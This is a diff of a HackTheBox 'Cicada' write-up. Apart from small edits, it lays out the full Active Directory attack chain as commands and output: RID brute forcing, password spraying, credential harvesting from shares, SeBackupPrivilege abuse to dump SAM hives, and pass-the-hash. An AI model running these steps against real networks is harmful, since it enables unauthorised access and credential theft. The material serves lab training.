@@ -12,26 +12,25 @@ categories:
   - hackthebox
 tags:
   - Active Directory
-  - AS-REP Roasting
-  - Aclpwn
-  - Bloodhound
-  - Sharphound
+  - SMB
+  - LDAP
+  - SeBackupPrivilege
 ---
 
 ## Summary
 
-Cicada is a windows AD box which required enumerating SMB shares to retrieve a default password in a note and the bruteforcing RID to obtain a list of users to perform a password spray attack. This leads to obtaining a user with shell access as well as being in the Backup Operators group. Thise preivileges are used to dump registry hhives and dump the machine hashes
+Cicada is a windows AD box which required enumerating SMB shares to retrieve a default password in a note and then bruteforcing RID to obtain a list of users to perform a password spray attack. This leads to obtaining a user with shell access as well as being in the Backup Operators group. These privileges are used to dump registry hives and dump the machine hashes
 
 ## Box Details
 
-OS: Windows
-Difficulty: Easy
+- OS: Windows
+- Difficulty: Easy
 
 <img src="/assets/images/cicada/cicada-logo.png">
 
 ## Scanning
 
-- NMAP TCP Port Scans
+- nmap TCP Port Scans
 
 ```
 $ sudo nmap -p- --min-rate 10000 10.129.118.69
@@ -55,7 +54,7 @@ PORT      STATE SERVICE
 54260/tcp open  unknown
 ```
 
-- NMAP UDP Port Scan
+- nmap UDP Port Scan
 
 ```
 $ sudo nmap -sU -p- --min-rate 10000 10.129.118.69
@@ -69,7 +68,7 @@ PORT    STATE SERVICE
 123/udp open  ntp
 ```
 
-- NMAP Service Scans
+- nmap Service Scans
 
 ```
 $ sudo nmap -p- --min-rate 10000 10.129.118.69 -sV -sC
@@ -131,7 +130,8 @@ Nmap done: 1 IP address (1 host up) scanned in 108.84 seconds
 
 ### 445 - SMB
 
-- Guest account can enumerate shares
+Guest account can enumerate shares
+
 ```
 $ nxc smb 10.129.118.69 -u guest -p '' --shares
 SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
@@ -148,7 +148,7 @@ SMB         10.129.118.69   445    CICADA-DC        NETLOGON                    
 SMB         10.129.118.69   445    CICADA-DC        SYSVOL                          Logon server share
 ```
 
-- Using nxc spider_plus module, there was a note in the HR share 
+Using nxc spider_plus module, there was a note in the HR share 
 
 ```
 $ nxc smb 10.129.118.69 -u guest -p '' -M spider_plus
@@ -194,7 +194,7 @@ SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size max:        1.
 }
 ```
 
-- Downloading the note
+Downloading the note
 
 ```
 $ smbclient \\\\10.129.118.69\\HR guest
@@ -211,7 +211,7 @@ getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (33.4 KiloBy
 smb: \> 
 ```
 
-- We have a password from the note but no usernames yet
+We have a password from the note but no usernames yet
 
 ```
 $ cat Notice\ from\ HR.txt 
@@ -240,7 +240,7 @@ Best regards,
 Cicada Corp
 ```
 
-- Using RID Brute forcing
+Using RID Brute forcing
 
 ```
 $ nxc smb 10.129.118.69 -u guest -p '' --rid-brute
@@ -279,7 +279,7 @@ SMB         10.129.118.69   445    CICADA-DC        1109: CICADA\Dev Support (Si
 SMB         10.129.118.69   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
 ```
 
-- Testing all found users with the default password
+Testing all found users with the default password
 
 ```
 nxc smb 10.129.118.69 -u final-users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
@@ -297,7 +297,8 @@ The user `michael.wrightson` authenticates to SMB and LDAP with this default pas
 
 ### 389 - LDAP
 
-- With LDAP access, we enumerate further to find password for user `david.orelious`
+With LDAP access, we enumerate further to find password for user `david.orelious`
+
 ```
 $ nxc ldap 10.129.118.69 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
 SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
@@ -314,7 +315,7 @@ LDAP        10.129.118.69   389    CICADA-DC        david.orelious              
 LDAP        10.129.118.69   389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0
 ```
 
-- Enumerating user `david.orelious` on SMB, we had access to new share DEV
+Enumerating user `david.orelious` on SMB, we had access to new share DEV
 
 ```
 $ nxc smb 10.129.118.69 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
@@ -332,7 +333,8 @@ SMB         10.129.118.69   445    CICADA-DC        NETLOGON        READ        
 SMB         10.129.118.69   445    CICADA-DC        SYSVOL          READ            Logon server share 
 ```
 
-- After spidering the DEV share, I found a script,  "Backup_script.ps1"
+After spidering the DEV share, I found a script  "Backup_script.ps1"
+
 ```
 $ nxc smb 10.129.118.69 -u david.orelious -p 'aRt$Lp#7t*VQ!3' -M spider_plus 
 SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
@@ -374,10 +376,9 @@ SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size max:        5.
             "size": "601 B"
         }
     },
-
 ```
 
-- From the script we found another creds for user emily.oscars
+From the script we found another creds for user emily.oscars
 
 ```
 $ cat Backup_script.ps1 
@@ -397,7 +398,7 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 ## Foothold as emily.oscars
 
-- This user has remote access to the server
+This user has remote access to the server
 
 ```
 $ nxc winrm 10.129.118.69 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
@@ -405,7 +406,7 @@ WINRM       10.129.118.69   5985   CICADA-DC        [*] Windows Server 2022 Buil
 WINRM       10.129.118.69   5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
 ```
 
-- With the user found we connect remotely to the server to get the user.txt
+With the user found we connect remotely to the server to get the user.txt
 
 ```
 $ evil-winrm -i 10.129.118.69 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
@@ -430,8 +431,8 @@ Mode                 LastWriteTime         Length Name
 
 ## Privilege Escalation
 
-- This user is part of the `Backup Operators` group and has the `SeBackupPrivilege` and `SeRestorePrivilege` privileges
-- Using robocopy to copy the root flag
+This user is part of the `Backup Operators` group and has the `SeBackupPrivilege` and `SeRestorePrivilege` privileges. Using robocopy to copy the root flag
+
 ```
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy /b C:\Users\Administrator\Desktop\ C:\
 
@@ -510,7 +511,7 @@ aff04caa2716dd1f90e3370609990de5
 *Evil-WinRM* PS C:\> 
 ```
 
-- Also we can backup the sam and system files for hash extraction
+- We can also backup the sam and system files for hash extraction
 
 ```
 *Evil-WinRM* PS C:\windows\temp> reg save hklm\sam SAM
@@ -533,7 +534,8 @@ Info: Download successful!
 
 ```
 
-- Successfully extracted the hashes
+Successfully extracted the hashes
+
 ```
 $ secretsdump.py LOCAL -sam SAM -system SYSTEM 
 Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
@@ -547,14 +549,16 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Cleaning up... 
 ```
 
-- the hash for Administrator works
+The hash for Administrator works for SMB
+
 ```
 $ nxc smb 10.129.62.87 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
 SMB         10.129.62.87    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.129.62.87    445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
 ```
 
-- We have access to the root.txt
+-We have access to the root.txt
+
 ```
 $ psexec.py Administrator@10.129.62.87 -hashes :2b87e7c93a3e8a0ea4a581937016f341
 Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
